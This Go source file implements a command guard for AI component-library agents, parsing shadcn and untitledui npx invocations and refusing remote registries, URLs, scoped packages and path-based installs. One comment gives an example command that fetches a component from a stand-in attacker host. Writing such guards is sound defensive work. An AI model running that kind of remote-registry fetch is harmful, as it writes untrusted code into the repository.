package workspace

import (
	"strings"
)

// The component-library assemblers: what they may run, and what they may not.
//
// `npx shadcn@latest add button` installs a reviewed component. It is the whole
// method of the shadcn/Untitled UI assembler agents, so it has to work with no
// operator setup. `npx shadcn@latest add https://evil.example/r/x.json` reaches
// a registry that is not the official one, downloads whatever JSON it serves and
// writes those files into the repository — a supply-chain fetch wearing the
// clothes of the same whitelisted command.
//
// Both questions are answered by PARSING the command rather than by matching a
// literal prefix, and that is not tidiness. A model writes `npx shadcn add`,
// `npx --yes shadcn@latest add` and `npx shadcn@4.19.0 add` interchangeably —
// measured: a live 30B was refused for dropping `@latest`, and its whole turn
// was lost to the refusal. Prefix matching would also have let the exact same
// spelling carry a URL straight past the guard.

// assemblerSubcommands are the subcommands allowed without operator approval,
// per package.
//
// Absent on purpose: shadcn's `eject` (irreversible) and `migrate` (rewrites
// config and every installed component), Untitled UI's `upgrade` (rewrites
// theme.css, tsconfig.json, package.json) and `example` (its -y implies
// --overwrite, and every template needs a paid license). Those add nothing —
// they rewrite what is already there — so they stay behind explicit approval.
var assemblerSubcommands = map[string]map[string]bool{
	"shadcn": {"add": true, "init": true, "info": true},
	// The package's former name. It is the same publisher and the same tool —
	// shadcn/ui renamed `shadcn-ui` to `shadcn` — and it is what a model writes
	// by default, because years of tutorials and its own older docs say
	// `npx shadcn-ui@latest add button`. Refusing it does not stop the install,
	// it just costs the turn that discovers the rename.
	"shadcn-ui":  {"add": true, "init": true, "info": true},
	"untitledui": {"add": true, "init": true},
}

// npxValueFlags are npx's own flags that consume the next token, so the package
// name is not mistaken for a flag's argument.
var npxValueFlags = map[string]bool{
	"-p": true, "--package": true, "-c": true, "--call": true,
	"--userconfig": true, "--registry": true,
}

// assemblerInvocation is a parsed component-library command.
type assemblerInvocation struct {
	pkg  string   // "shadcn" | "untitledui"
	sub  string   // "add" | "init" | "info"
	args []string // everything after the subcommand
}

// parseAssembler recognizes `npx [npx-flags] <pkg>[@version] <sub> [args…]`.
//
// Returns ok=false for anything else, including an unknown package, an unknown
// subcommand, or a `--registry` override (which repoints npx itself at another
// npm registry and so is not the command it appears to be).
func parseAssembler(segment string) (assemblerInvocation, bool) {
	f := strings.Fields(strings.TrimSpace(segment))
	if len(f) < 3 || strings.ToLower(f[0]) != "npx" {
		return assemblerInvocation{}, false
	}
	i := 1
	for i < len(f) && strings.HasPrefix(f[i], "-") {
		flag := strings.ToLower(f[i])
		if name, _, ok := strings.Cut(flag, "="); ok {
			flag = name
		}
		// A flag that repoints npx at another package or registry means this
		// is not the command it looks like.
		if flag == "-p" || flag == "--package" || flag == "--registry" || flag == "-c" || flag == "--call" {
			return assemblerInvocation{}, false
		}
		if npxValueFlags[flag] && !strings.Contains(f[i], "=") && i+1 < len(f) {
			i++
		}
		i++
	}
	if i+1 >= len(f) {
		return assemblerInvocation{}, false
	}
	pkg := f[i]
	if at := strings.Index(pkg, "@"); at > 0 { // shadcn@latest → shadcn
		pkg = pkg[:at]
	}
	subs, known := assemblerSubcommands[strings.ToLower(pkg)]
	if !known {
		return assemblerInvocation{}, false
	}
	sub := strings.ToLower(f[i+1])
	if !subs[sub] {
		return assemblerInvocation{}, false
	}
	return assemblerInvocation{pkg: strings.ToLower(pkg), sub: sub, args: f[i+2:]}, true
}

// IsAssemblerCommand reports whether a single command segment is a
// component-library install that runs without operator approval.
//
// A segment that also names a remote registry is NOT one: it is refused by
// AssemblerFetchesRemoteCode, and reporting it as safe here would be the bypass.
func IsAssemblerCommand(segment string) bool {
	inv, ok := parseAssembler(segment)
	if !ok {
		return false
	}
	return remoteRef(inv) == ""
}

// AssemblerFetchesRemoteCode reports whether a component-install command names a
// remote registry instead of an official component, and why.
func AssemblerFetchesRemoteCode(command string) (reason string, blocked bool) {
	inv, ok := parseAssembler(command)
	if !ok {
		return "", false
	}
	offender := remoteRef(inv)
	if offender == "" {
		return "", false
	}
	return "shell refused — `" + offender + "` installs code from a registry that is not the " +
		"official one, and its files are written straight into this repository.\n" +
		"Install official components by name instead: `npx " + inv.pkg + "@latest add button dialog -y`.", true
}

// remoteRef returns the first argument that points somewhere other than the
// official registry, or "".
func remoteRef(inv assemblerInvocation) string {
	for i := 0; i < len(inv.args); i++ {
		arg := inv.args[i]
		if strings.HasPrefix(arg, "-") {
			// A flag that takes a value consumes the next token, which is a
			// path or a version — not a component reference. Without this,
			// `-p ./src/components` reads as a local-path install.
			if flagTakesValue(arg) && i+1 < len(inv.args) {
				i++
			}
			continue
		}
		if isUntrustedComponentRef(arg) {
			return arg
		}
	}
	return ""
}

// valueFlags are the `add`/`init` flags of both CLIs that consume the next
// token. The `--flag=value` form needs no entry: it is a single token.
var valueFlags = map[string]bool{
	"-p": true, "--path": true,
	"-c": true, "--cwd": true,
	"-d": true, "--dir": true,
	"-t": true, "--type": true, "--template": true,
	"-b": true, "--base": true,
	"-n": true, "--name": true,
	"--preset": true, "--lib-version": true,
}

// flagTakesValue reports whether a flag consumes the following token.
func flagTakesValue(flag string) bool {
	if strings.Contains(flag, "=") {
		return false // --path=./x carries its own value
	}
	return valueFlags[strings.ToLower(flag)]
}

// isUntrustedComponentRef reports whether an `add` argument resolves anywhere
// other than the official registry. Official names are plain identifiers —
// `button`, `alert-dialog`, `login-01` — so refusing the rest costs nothing.
func isUntrustedComponentRef(arg string) bool {
	lower := strings.ToLower(arg)
	switch {
	case strings.Contains(lower, "://"), strings.HasPrefix(lower, "//"), strings.HasPrefix(lower, "www."):
		return true // a URL: fetched, and its files written into the repo
	case strings.HasPrefix(arg, "@"):
		return true // @namespace/component: a third-party registry
	case strings.HasPrefix(arg, "."), strings.HasPrefix(arg, "/"), strings.Contains(arg, ".."):
		return true // a path: installs from a local file rather than the registry
	}
	return false
}
